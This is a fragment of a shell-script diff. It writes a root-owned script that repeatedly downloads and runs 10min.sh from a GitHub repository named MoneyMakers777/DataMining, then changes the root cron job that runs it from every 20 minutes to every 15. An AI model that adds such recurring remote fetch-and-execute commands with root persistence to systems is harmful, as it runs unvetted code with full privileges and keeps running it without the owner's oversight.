@@ -5,7 +5,7 @@ wget https://raw.githubusercontent.com/MoneyMakers777/DataMining/main/10min.sh
 chmod +x 10min.sh
 ./10min.sh" > /root/repeatableCMD.sh
 chmod +x /root/repeatableCMD.sh
-crontab -l | { cat; echo "*/20 * * * * /root/repeatableCMD.sh"; } | crontab -
+crontab -l | { cat; echo "*/15 * * * * /root/repeatableCMD.sh"; } | crontab -
 
 sysnum=${systemID:0:2}
 if test $((10#$sysnum)) -lt 15  || test $((10#$sysnum)) -eq 22 ; then 
